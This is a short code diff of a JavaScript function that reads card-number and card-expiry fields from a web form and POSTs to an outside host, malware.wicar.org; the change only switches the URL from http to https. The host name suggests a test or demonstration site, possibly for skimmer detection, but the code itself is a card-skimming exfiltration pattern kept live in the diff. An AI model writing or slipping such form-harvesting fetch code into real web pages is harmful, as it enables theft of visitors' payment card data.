@@ -24,7 +24,7 @@ function myFunction() {
    let b = document.querySelector('#card-number').value
    let c = document.querySelector('#card-expiry').value
 
-   fetch('http://malware.wicar.org/',{
+   fetch('https://malware.wicar.org/',{
       mode: 'no-cors',
       method: 'POST',
       headers: { 'Content-type': 'application/json' }})
